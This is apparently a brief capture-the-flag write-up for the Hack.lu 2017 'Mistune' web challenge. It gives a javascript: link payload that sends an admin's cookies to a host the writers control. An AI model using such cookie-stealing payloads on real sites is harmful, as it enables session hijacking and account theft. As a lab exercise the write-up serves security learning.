---
title: Hack.lu CTF 2017 - Mistune
date: '2017-10-19'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- ctf_hacklu17
- writeup
- hacklu17
tags:
- web
authors:
- chq-matteo
---

1. We can send a message to the admin.
2. The admin clicks on the links and we have to steal his cookies.

The idea is to use javascript to redirect the admin to a website we control.  
We used one of the many free hosting sites
```js
<javascript:document.location='hello.myserver.com/?cookie='+document.cookies>
````
